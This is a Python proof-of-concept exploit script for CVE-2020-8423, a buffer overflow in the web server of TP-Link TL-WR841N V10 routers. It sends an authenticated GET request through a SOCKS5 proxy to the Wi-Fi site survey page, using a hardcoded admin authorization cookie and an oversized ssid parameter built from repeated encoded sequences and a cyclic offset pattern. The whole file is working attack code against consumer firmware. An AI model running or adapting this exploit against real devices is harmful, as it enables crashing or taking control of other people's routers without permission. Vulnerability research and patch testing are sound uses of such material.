# -*- coding: utf-8 -*-
# @date  : 2026/1/27

import requests
import socket
import socks

"""
# CVE-2020-8423 poc/exp

TP-Link TL-WR841N V10 httpd Buffer Overflow Allows Authenticated Remote Code Execution via Wi-Fi Configuration Page
A buffer overflow in the httpd daemon on TP-Link TL-WR841N V10 (firmware version 3.16.9) devices allows an authenticated remote attacker to execute arbitrary code via a GET request to the page for the configuration of the Wi-Fi network.

"""

# need to confirm use socks proxy can visit target web
SOCKS5_PROXY_HOST = '127.0.0.1'
SOCKS5_PROXY_PORT = 1080

default_socket = socket.socket
socks.set_default_proxy(socks.SOCKS5, SOCKS5_PROXY_HOST, SOCKS5_PROXY_PORT)
socket.socket = socks.socksocket
session = requests.Session()
session.verify = False


def launch(dynamic_path):
    PATH = f"/{dynamic_path}/userRpm/popupSiteSurveyRpm_AP.htm"
    # target info
    TARGET = "http://192.168.2.2"

    # set headers cookie
    headers = {
        # "User-Agent": "curl/7.68.0",
        "Cookie": "Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"
    }

    # payload (same as python -c print)
    payload = "/%0A" * 0x55
    payload += (
        "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaz"
        "aabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabza"
        "acbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac"
    )

    # cat request url
    url = (
        f"{TARGET}{PATH}"
        f"?mode=1000"
        f"&curRegion=1000"
        f"&chanWidth=100"
        f"&channel=1000"
        f"&ssid={payload}"
    )

    print("[*] URL length:", len(url))
    print("[*] Sending request...")

    # send request
    try:
        r = session.get(url, headers=headers, timeout=10)
        print("[*] Status:", r.status_code)
        print(r.text[:500])
    except Exception as e:
        print("[!] Request failed / connection closed:", e)


if __name__ == '__main__':
    # change when each login
    dynamic_path = "VVYMDCRAAVHUQLWB"
    launch(dynamic_path)